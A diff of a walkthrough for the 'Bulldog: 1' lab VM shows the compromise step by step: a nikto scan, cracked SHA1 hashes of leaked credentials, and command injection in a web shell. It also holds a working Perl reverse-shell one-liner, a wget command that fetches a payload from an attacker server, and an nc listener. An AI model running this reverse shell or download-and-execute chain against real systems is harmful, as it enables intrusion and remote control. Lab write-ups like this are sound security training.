@@ -1,9 +1,22 @@
-find  http://192.168.56.101:8080/dev/ 
+Bulldog: 1 write-up
 
-open html page http://192.168.56.101:8080/dev/
 
-find commented cred 
+scan host:
 
+nikto http://192.168.56.101:8080/
+
+
+![alt text](https://github.com/s1l3xz/some/nikto.jpg)
+
+	
+	find /dev dir
+
+
+Visit http://192.168.56.101:8080/dev/
+	
+	find comments in web page source
+
+	![alt text](https://github.com/s1l3xz/some/comments.png)
 
 	<!--Need these password hashes for testing. Django's default is too complex-->
 	<!--We'll remove these in prod. It's not like a hacker can do anything with a hash-->
@@ -16,36 +29,40 @@ find commented cred
 	Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e-->
 
 
-	brute several 
+Try to brute forse over : https://crackstation.net/
 
 	Back End: nick@bulldogindustries.com<br><br><!--ddf45997a7e18a25ad5f5cf222da64814dd060d5--> bulldog  ( sha1 )
 
 	Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--> bulldoglover ( sha1 )
 
 
-login to django over http://192.168.56.101:8080/admin
 
-go to http://192.168.56.101:8080/dev/shell/
+Login to django admin page http://192.168.56.101:8080/admin with one of credentials
 
 
-use CLI over &  ( example: ls & id & ls)
+Than go to  http://192.168.56.101:8080/dev/shell/
 
-up local server with perl reverse shell script :
+Find CLI vulnerability in command field:
+
+![alt text](https://github.com/s1l3xz/some/CLI.png)
+
+store perl reverse shell on my remote apache server:
 
 use Socket;$i="192.168.56.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
 
-use CLI to downlod perl rev shell:
-
+use CLI to downlod perl rev shell on bulldog machine:
 
 ls & wget http://attacker_server/perl_script.pl -O /tmp/lol.pl
 
+
 open nc on attacker side : nc -lvp 1234
 
-execute perl script:	ls & perl /tmp/lol2.pl & id
+execute perl script over CLI :ls & perl /tmp/lol2.pl & id
 
-get rev shell under jango;
 
-get tty shell over "python -c 'import pty; pty.spawn("/bin/sh")'"
+Get rev shell under jango
+
+![alt text](https://github.com/s1l3xz/some/rev_shell.png)
 
 find customPermissionApp elf file in /home/bulldogadmin/.hiddenadmindirectory directory
 
@@ -57,16 +74,4 @@ got root ;
 
 find secret in /root/congrats.txt
 
-
-cat congrats.txt
-Congratulations on completing this VM :D That wasn't so bad was it?
-
-Let me know what you thought on twitter, I'm @frichette_n
-
-As far as I know there are two ways to get root. Can you find the other one?
-
-Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!
-
-
-
-
+![alt text](https://github.com/s1l3xz/some/proof.jpg)
